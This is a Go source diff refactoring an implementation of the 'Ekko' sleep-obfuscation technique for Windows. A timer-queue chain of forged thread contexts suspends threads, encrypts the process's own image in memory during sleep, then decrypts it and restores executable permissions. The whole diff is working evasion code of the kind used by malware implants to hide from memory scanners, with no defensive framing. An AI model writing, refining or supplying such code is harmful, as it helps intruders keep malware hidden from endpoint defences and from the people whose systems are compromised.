@@ -121,91 +121,69 @@ func EkkoSleep(sleepTime uint64) error {
 	return ekkoErr
 }
 
+// chainTail is the non-CONTEXT data the timer chain points at. It lives in the
+// VirtualAlloc block right after the CONTEXTs. Never store a pointer to Go
+// memory in it: the GC doesn't scan the block.
+type chainTail struct {
+	Img, Key UString
+	KeyBuf   [16]byte
+	OldProt  uint32 // VirtualProtect writes a DWORD
+}
+
 func ekko(sleepTime uint64, peers []windows.Handle) error {
 
-	var CtxThread CONTEXT
-	var RopProtRW CONTEXT
-	var RopMemEnc CONTEXT
-	var RopDelay CONTEXT
-	var RopMemDec CONTEXT
-	var RopProtRX CONTEXT
-	var RopSetEvt CONTEXT
+	// Everything the timer thread reads or writes lives in one VirtualAlloc
+	// block: it never moves, the GC never frees it, and it's page-aligned, so
+	// every CONTEXT is 16-byte aligned. It's outside the image, so it stays
+	// readable while the image is encrypted.
+	nCtx := 2*len(peers) + 10 // 2n+8 steps + scratch + capture
+	ctxBytes := uintptr(nCtx) * unsafe.Sizeof(CONTEXT{})
+	base, err := windows.VirtualAlloc(0, ctxBytes+unsafe.Sizeof(chainTail{}), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return err
+	}
+	defer windows.VirtualFree(base, 0, windows.MEM_RELEASE)
 
-	var keybuf [16]byte
-        rand.Read(keybuf[:])
+	ctxs := unsafe.Slice((*CONTEXT)(unsafe.Pointer(base)), nCtx)
+	t := (*chainTail)(unsafe.Pointer(base + ctxBytes))
+	buf := ctxs[:nCtx-2]       // the chain steps
+	scratch := &ctxs[nCtx-2]   // GetThreadContext's output: we want the sync, not the data
+	CtxThread := &ctxs[nCtx-1] // RtlCaptureContext writes the timer thread's registers here
+	scratch.ContextFlags = contextControlAMD64
 
-	var Key, Img UString
+	rand.Read(t.KeyBuf[:])
+	t.Key.Buffer = &t.KeyBuf[0]
+	t.Key.Length = uint32(len(t.KeyBuf))
 
 	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
 	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
 	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
+	t.Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
+	t.Img.Length = nt_header.OptionalHeader.SizeOfImage
 
 	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
 	var hNewTimer, hTimerQueue uintptr
 	hTimerQueue, _, _ = procCreateTimerQueue.Call()
 
-	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
-	Img.Length = nt_header.OptionalHeader.SizeOfImage
-
-	Key.Buffer = &keybuf[0]
-	Key.Length = uint32(unsafe.Sizeof(Key))
-
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
+	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
 	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)
 
 	if CtxThread.Rip == 0 {
 		log.Fatalln()
 	}
-	RopProtRW = CtxThread
-	RopMemEnc = CtxThread
-	RopDelay = CtxThread
-	RopMemDec = CtxThread
-	RopProtRX = CtxThread
-	RopSetEvt = CtxThread
 
-	var OldProtect uint64
-	RopProtRW.Rsp -= 8
-	RopProtRW.Rip = uint64(procVirtualProtect.Addr())
-	RopProtRW.Rcx = uint64(ImageBase)
-	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
-	RopProtRW.R8 = windows.PAGE_READWRITE
-	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
-
-	RopMemEnc.Rsp -= 8
-	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
-	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
-	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
-
-	RopDelay.Rsp -= 8
-	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
-	RopDelay.Rcx = uint64(windows.CurrentProcess())
-	RopDelay.Rdx = sleepTime
-
-	RopMemDec.Rsp -= 8
-	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
-	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
-	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
-
-	RopProtRX.Rsp -= 8
-	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
-	RopProtRX.Rcx = uint64(ImageBase)
-	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
-	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
-	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
-
-	// SetEvent( hEvent );
-	RopSetEvt.Rsp -= 8
-	RopSetEvt.Rip = uint64(procSetEvent.Addr())
-	RopSetEvt.Rcx = uint64(hEvent)
-
+	// The addresses the chain needs, as the plain integers they become in registers.
+	pImg := uint64(uintptr(unsafe.Pointer(&t.Img)))
+	pKey := uint64(uintptr(unsafe.Pointer(&t.Key)))
+	pOld := uint64(uintptr(unsafe.Pointer(&t.OldProt)))
+	pScratch := uint64(uintptr(unsafe.Pointer(scratch)))
+	imgBase := uint64(ImageBase)
+	imgSize := uint64(t.Img.Length)
+	self := uint64(windows.CurrentProcess())
 
 	const gapMs = 100 // spacing between phases; steps inside one phase may run in any order
 
 	hReady, _, _ := procCreateEventW.Call(0, 0, 0, 0)
-	n := len(peers)
-	buf := make([]CONTEXT, 2*n+9) // 2n+8 steps + 1 scratch; size isn't constant, so it's on the heap
-	scratch := &buf[len(buf)-1]   // GetThreadContext's output: we want the sync, not the data
-	scratch.ContextFlags = contextControlAMD64
 
 	i := 0
 	queue := func(c CONTEXT, phase int) {
@@ -215,30 +193,30 @@ func ekko(sleepTime uint64, peers []windows.Handle) error {
 		i++
 	}
 
-	queue(step(&CtxThread, procWaitForSingleObject.Addr(), uint64(hReady), uint64(windows.INFINITE)), 1) // gate
+	queue(step(CtxThread, procWaitForSingleObject.Addr(), uint64(hReady), uint64(windows.INFINITE)), 1) // gate
 	for _, h := range peers {
-		queue(step(&CtxThread, procSuspendThread.Addr(), uint64(h)), 2)
+		queue(step(CtxThread, procSuspendThread.Addr(), uint64(h)), 2)
 	}
 	for _, h := range peers {
-		queue(step(&CtxThread, procGetThreadContext.Addr(), uint64(h), uint64(uintptr(unsafe.Pointer(scratch)))), 3)
+		queue(step(CtxThread, procGetThreadContext.Addr(), uint64(h), pScratch), 3)
 	}
-	queue(RopProtRW, 4)
-	queue(RopMemEnc, 5)
-	queue(RopDelay, 6)
-	queue(RopMemDec, 7)
-	queue(RopProtRX, 8)
-	queue(step(&CtxThread, procNtResumeProcess.Addr(), uint64(windows.CurrentProcess())), 9)
-	queue(RopSetEvt, 10)
+	queue(step(CtxThread, procVirtualProtect.Addr(), imgBase, imgSize, windows.PAGE_READWRITE, pOld), 4)
+	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 5)        // encrypt
+	queue(step(CtxThread, procWaitForSingleObject.Addr(), self, sleepTime), 6) // sleep
+	queue(step(CtxThread, procSystemFunction032.Addr(), pImg, pKey), 7)        // decrypt
+	queue(step(CtxThread, procVirtualProtect.Addr(), imgBase, imgSize, windows.PAGE_EXECUTE_READWRITE, pOld), 8)
+	queue(step(CtxThread, procNtResumeProcess.Addr(), self), 9)
+	queue(step(CtxThread, procSetEvent.Addr(), uint64(hEvent)), 10)
 
 	// Signal the gate and start waiting in one kernel call: once the chain runs, G1 has no Go code left.
 	procSignalObjectAndWait.Call(hReady, hEvent, uintptr(windows.INFINITE), 0)
-	runtime.KeepAlive(buf) // the timer thread reads buf through raw addresses the GC can't see
 
 	procDeleteTimerQueue.Call(hTimerQueue)
 	windows.CloseHandle(windows.Handle(hReady))
 	windows.CloseHandle(windows.Handle(hEvent))
 	return nil
 }
+
 
 
 // step returns a copy of base that calls fn(args...) and then returns into the timer dispatcher.
